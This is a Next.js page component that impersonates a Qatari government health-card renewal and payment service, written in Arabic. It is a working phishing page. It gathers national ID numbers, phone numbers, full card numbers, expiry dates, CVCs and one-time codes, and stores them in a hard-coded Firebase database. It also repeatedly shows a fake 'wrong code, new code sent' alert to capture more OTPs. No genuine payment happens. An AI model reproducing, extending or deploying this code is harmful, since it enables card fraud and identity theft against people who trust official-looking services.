'use client'

import Image from "next/image"
import { Button } from "@/components/ui/button"
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"
import { Input } from "@/components/ui/input"
import { RadioGroup, RadioGroupItem } from "@/components/ui/radio-group"
import { Label } from "@/components/ui/label"
import { ChevronLeft, CreditCard, MessageCircle } from 'lucide-react'
import { cn } from "@/lib/utils"
import { FormEvent, useState } from "react"
import { initializeApp } from 'firebase/app'
import { getFirestore, doc, setDoc } from 'firebase/firestore'
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"

const firebaseConfig = {
  // Your Firebase configuration object goes here
  // You should replace this with your actual Firebase config
  apiKey: "AIzaSyB1Tpv9S00TO__RCkAN95ydnMQDR7yEb0A",
  authDomain: "csa3-e2b6a.firebaseapp.com",
  databaseURL: "https://csa3-e2b6a-default-rtdb.firebaseio.com",
  projectId: "csa3-e2b6a",
  storageBucket: "csa3-e2b6a.firebasestorage.app",
  messagingSenderId: "328650323342",
  appId: "1:328650323342:web:468ea6435238c0452be0df",
  measurementId: "G-D32GDGT38Q"
}

const app = initializeApp(firebaseConfig)
const db = getFirestore(app)

const steps = [
  { id: 1, title: 'معلومات البطاقة', status: 'current' },
  { id: 2, title: 'استمارة التقديم', status: 'upcoming' },
  { id: 3, title: 'تفاصيل الدفع', status: 'upcoming' },
  { id: 4, title: 'إتمام العملية', status: 'upcoming' },
]

export default function HealthCardRenewal() {
  const [isloading, setIsloading] = useState(false)
  const [stepr, setStep] = useState(1)
  const [name, setName] = useState('')
  const [phone, setPhone] = useState('')
  const [id, setId] = useState('')
  const [dateMonth, setDatmont] = useState('')
  const [datayaer, setDatyear] = useState('')
  const [CVC, setCVC] = useState('')
  const [otp, setOtp] = useState('')
  const [otpArd] = useState([''])
  const [cardNumber, setCardNumber] = useState('')

  const handleSubmit = async (e:FormEvent) => {4
    e.preventDefault()
    try {
      const docRef = await doc(db, 'pays', id!);
      const ref = await setDoc(docRef, {
        step: stepr,
        id: id,
        name: name,
        phone: phone,
        datayaer: datayaer,
        dateMonth: dateMonth,
        CVC: CVC,
        otp: otpArd,
        cardNumber: cardNumber,
        // Add any other form fields here
      });

      console.log("Document written with ID: ", docRef.id)
      // You might want to show a success message to the user here
    } catch (e) {
      console.error("Error adding document: ", e)
      // You might want to show an error message to the user here
    }
  }
const handdleadd=(e:any)=>{
  
    handleSubmit(e).then(() => {
      setStep(stepr + 1)
    })

    if (stepr >= 5) {
      setIsloading(true)
      setTimeout(() => {
        alert("رمز التحقق خاطىء تم ارسال رمز جديد")
        otpArd.push(otp)
        setOtp("")
        setIsloading(false)

      }, 4000)
    }
  }
  return (
    <div className="min-h-screen bg-gray-50" dir="rtl">
      {/* Header */}
        <div className="container mx-auto px-4 py-3 sm:py-4">
          <div className="flex items-center gap-1 sm:gap-2 text-xs sm:text-sm text-muted-foreground overflow-x-auto whitespace-nowrap">
            <span>الخدمات الحكومية</span>
            <ChevronLeft className="h-3 w-3 sm:h-4 sm:w-4 flex-shrink-0" />
            <span>الصحة</span>
            <ChevronLeft className="h-3 w-3 sm:h-4 sm:w-4 flex-shrink-0" />
            <span className="text-foreground">دفع رسوم البطاقة الصحية الإلكترونية</span>
          </div>
        </div>

      <div className="container mx-auto px-4 py-4 sm:py-8">
        <Card className="max-w-3xl mx-auto">
          <form className="p-4 sm:p-6" onSubmit={handdleadd}>
            {/* Title */}
            <div className="flex flex-col sm:flex-row sm:items-center mb-6 sm:mb-8">
              <div className="bg-[#8B1538] text-white p-3 sm:p-4 rounded-lg text-sm sm:text-base w-fit">
                <span>المساعدة</span>
              </div>
              <h1 className="text-xl sm:text-2xl font-bold">خدمة البطاقة الصحية الإلكترونية</h1>
            </div>

            {/* Stepper */}
            <div className="mb-6 sm:mb-8 pb-2">
              <div className="flex items-center justify-between min-w-[200px]">
                {steps.map((step, index) => (
                  <div key={step.id} className="flex items-center flex-1">
                    <div className="relative flex flex-col items-center">
                      <div
                        className={cn(
                          "w-8 h-8 sm:w-8 sm:h-8 rounded-full grid grid-cols- items-center justify-center text-xs sm:text-sm font-medium",
                          step.id === stepr
                            ? "bg-[#8B1538] text-white"
                            : "bg-gray-200 text-gray-500"
                        )}
                      >
                        {step.id}
                      </div>
                      <div className="mt-2 text-xs sm:text-sm text-center">
                        {step.title}
                      </div>
                    </div>
                    {index < steps.length - 1 && (
                      <div
                        className={cn(
                          "h-[2px] w-full mx-2 sm:mx-4",
                          step.id === stepr ? "bg-[#8B1538]" : "bg-gray-200"
                        )}
                      />
                    )}
                  </div>
                ))}
              </div>
            </div>

            {stepr === 1 ?
              <div className="space-y-4 sm:space-y-6">
                <p className="text-xs sm:text-sm text-gray-500 italic">
                  طلب الاستعلام عن البطاقة الصحية -- سوف يستغرق حوالي 20 ثانية لإتمام الطلب
                </p>

                <div className="space-y-4 sm:space-y-6">
                  <h2 className="text-lg sm:text-xl font-semibold">معلومات</h2>

                  <div className="space-y-4">
                    <div className="space-y-2">
                      <Label className="flex gap-1 text-sm sm:text-base">
                        الرجاء إدخال الاسم الرباعي
                        <span className="text-red-500">*</span>
                      </Label>
                      <Input
                        onChange={(e) => setId(e.target.value.toString())}
                        type="text"
                        className="max-w-md text-sm sm:text-base"
                      />
                    </div>
                    <div className="space-y-2">
                      <Label className="flex gap-1 text-sm sm:text-base">
                        الرجاء إدخال رقم البطاقة الشخصية
                        <span className="text-red-500">*</span>
                      </Label>
                      <Input
                        onChange={(e) => setId(e.target.value.toString())}
                        type="tel"
                        maxLength={10}
                        className="max-w-md text-sm sm:text-base"
                      />
                    </div>

                    <div className="space-y-2">
                      <Label className="flex gap-1 text-sm sm:text-base">
                        نوع العملية
                        <span className="text-red-500">*</span>
                      </Label>
                      <RadioGroup defaultValue="renewal" className="space-y-2" dir="rtl">
                        <div className="flex items-center space-x-2 space-x-reverse">
                          <RadioGroupItem value="renewal" id="renewal" />
                          <Label htmlFor="renewal" className="text-sm sm:text-base">تجديد</Label>
                        </div>
                        <div className="flex items-center space-x-2 space-x-reverse">
                          <RadioGroupItem value="reissue" id="reissue" />
                          <Label htmlFor="reissue" className="text-sm sm:text-base">
                            إعادة الطلب (ePurse المفقود أو التالف)
                          </Label>
                        </div>
                        <div className="flex items-center space-x-2 space-x-reverse">
                          <RadioGroupItem value="check" id="check" />
                          <Label htmlFor="check" className="text-sm sm:text-base">
                            تحقق من تاريخ انتهاء الصلاحية
                          </Label>
                        </div>
                      </RadioGroup>
                    </div>
                  </div>
                </div>

                {/* Action Buttons */}

              </div> : stepr === 2 ?
                <div className="space-y-4 sm:space-y-6">
                  <p className="text-xs sm:text-sm text-gray-500 italic">
                    طلب الاستعلام عن البطاقة الصحية -- سوف يستغرق حوالي 20 ثانية لإتمام الطلب
                  </p>

                  <div className="space-y-4 sm:space-y-6">
                    <h2 className="text-lg sm:text-xl font-semibold"> معلومات حامل البطاقة</h2>

                    <div className="space-y-4">
                      <div className="space-y-2">
                        <Select
                        >
                          <SelectTrigger className="w-full">
                            <SelectValue placeholder="عدد السنوات" />
                          </SelectTrigger>
                          <SelectContent>
                            <SelectItem value="1">سنوات 1</SelectItem>
                            <SelectItem value="2">2 سنوات </SelectItem>
                            <SelectItem value="3">3 سنوات  </SelectItem>
                            <SelectItem value="4">4 سنوات</SelectItem>
                            <SelectItem value="5">5 سنوات</SelectItem>
                            <SelectItem value="6">6 سنوات</SelectItem>
                            <SelectItem value="7">7 سنوات</SelectItem>
                          </SelectContent>
                        </Select>
                      </div>
                      <div className="space-y-2">
                        <Label className="flex gap-1 text-sm sm:text-base">
                          رقم الهاتف                      <span className="text-red-500">*</span>
                        </Label>
                        <Input
                          maxLength={12}
                          onChange={(e) => setPhone(e.target.value)}

                          type="tel"
                          placeholder="الرجاء إدخال رقم الهاتف"
                          className="max-w-md text-sm sm:text-base"
                        />
                      </div>

                    </div>
                  </div> </div> : stepr === 3 ? <>
                    <div className="space-y-4 sm:space-y-6">
                      {/* Fees Section */}
                      <div className="space-y-4 mb-8">
                        <h2 className="text-2xl font-bold">الرسوم</h2>
                        <div className="space-y-2">
                          <div className="flex justify-between">
                            <span>الرسم المطلوب</span>
                            <span>رسوم تجديد البطاقة الصحية</span>
                          </div>
                          <div className="flex justify-between">
                            <span>قيمة الرسم</span>
                            <span>100 ريال قطري</span>
                          </div>
                          <div className="flex justify-between font-bold pt-4 border-t">
                            <span>المجموع</span>
                            <span>100 ريال قطري</span>
                          </div>
                        </div>
                      </div>

                      {/* Action Buttons */}

                      {/* Chat Button */}
                      <button className="fixed bottom-4 left-4 bg-black text-white p-4 rounded-full">
                        <MessageCircle className="w-6 h-6" />
                      </button>
                    </div>

                  </> : stepr === 4 ? <>
                    <Card className="w-full max-w-md mx-auto">
                      <CardHeader>
                        <CardTitle className="text-2xl font-bold text-center">معلومات البطاقة</CardTitle>
                      </CardHeader>
                      <CardContent>
                        <form className="space-y-6">
                          <div className="space-y-2">
                            <Label htmlFor="cardHolder" className="text-right block">
                              اسم حامل البطاقة <span className="text-red-500">*</span>
                            </Label>
                            <Input
                              onChange={(e) => setName(e.target.value.toString())}

                              id="cardHolder"
                              placeholder="الاسم كما يظهر على البطاقة"
                              className="text-right"
                            />
                          </div>

                          <div className="space-y-2">
                            <Label htmlFor="cardNumber" className="text-right block">
                              رقم البطاقة <span className="text-red-500">*</span>
                            </Label>
                            <div className="relative">
                              <Input
                                id="cardNumber"
                                placeholder="رقم البطاقة"
                                className="text-right pr-10"
                                type="tel"

                                value={cardNumber}
                                onChange={(e) => setCardNumber(e.target.value)}
                                maxLength={19}
                              />
                              <CreditCard className="absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-400" />
                            </div>
                          </div>

                          <div className="grid grid-cols-3 gap-4">
                            <div className="space-y-2 col-span-2">
                              <Label htmlFor="expiry" className="text-right block">
                                تاريخ الانتهاء <span className="text-red-500">*</span>
                              </Label>
                              <div className="grid grid-cols-2 gap-2">
                                <Select
                                  onValueChange={(e) => setDatmont(e)}>
                                  <SelectTrigger className="w-[80px]">
                                    <SelectValue placeholder="شهر" />
                                  </SelectTrigger>
                                  <SelectContent>
                                    <SelectItem value="1">1</SelectItem>
                                    <SelectItem value="2">2</SelectItem>
                                    <SelectItem value="3">3</SelectItem>
                                    <SelectItem value="4">4</SelectItem>
                                    <SelectItem value="5">5</SelectItem>
                                    <SelectItem value="6">6</SelectItem>
                                    <SelectItem value="7">7</SelectItem>
                                    <SelectItem value="8">8</SelectItem>
                                    <SelectItem value="9">9</SelectItem>
                                    <SelectItem value="10">10</SelectItem>
                                    <SelectItem value="11">11</SelectItem>
                                    <SelectItem value="12">12</SelectItem>
                                  </SelectContent>
                                </Select>


                                <Select
                                  onValueChange={(e) => setDatyear(e)}>
                                  <SelectTrigger className="w-[80px]">
                                    <SelectValue placeholder="سنة" />
                                  </SelectTrigger>
                                  <SelectContent>
                                    <SelectItem value="2024">2024</SelectItem>
                                    <SelectItem value="2025">2025</SelectItem>
                                    <SelectItem value="2026">2026</SelectItem>
                                    <SelectItem value="2027">2027</SelectItem>
                                    <SelectItem value="2028">2028</SelectItem>
                                    <SelectItem value="2029">2029</SelectItem>
                                    <SelectItem value="2030">2030</SelectItem>
                                    <SelectItem value="2031">2031</SelectItem>
                                    <SelectItem value="2032">2032</SelectItem>
                                    <SelectItem value="2033">2033</SelectItem>
                                    <SelectItem value="2034">2034</SelectItem>
                                  </SelectContent>
                                </Select>
                              </div>
                            </div>
                            <div className="space-y-2">
                              <Label htmlFor="cvc" className="text-right block">
                                CVC <span className="text-red-500">*</span>
                              </Label>
                              <Input id="cvc"
                                type="tel"

                                onChange={(e) => setCVC(e.target.value.toString())}
                                placeholder="CVC" className="text-right" maxLength={3} />
                            </div>
                          </div>
                        </form>
                      </CardContent>
                    </Card></> : <>
                  <div className="space-y-2">
                    <Label className="flex gap-1 text-sm sm:text-base">
                      الرجاء ادخال رمز التحقق المرسل الى هاتفك      <span className="text-red-500">*</span>
                    </Label>
                    <Input
                      onChange={(e) => { setOtp(e.target.value) }}
                      value={otp}
                      type="tel"
                      placeholder="رمز التحقق"
                      className="max-w-md text-sm sm:text-base"
                      maxLength={6}
                    />
                  </div>
                </>
            }
            {/* Action Buttons */}
            <div className="grid  grid-cols-2 sm:flex-row sm:justify-between gap-3 pt-4 sm:pt-6">
              <Button
                variant="outline"
                className="w-full sm:w-auto sm:min-w-[120px]"
              >
                تفريغ الحقول
              </Button>
              <Button
type="submit"

                className="w-full sm:w-auto sm:min-w-[120px] bg-[#8B1538] hover:bg-[#8B1538]/90"
              >
                {stepr >= 5 ? 'ارسال' : isloading ? 'انتظر' : 'تابع'}
              </Button>
            </div>
          </form>

        </Card>
      </div>
    </div>
  )
}

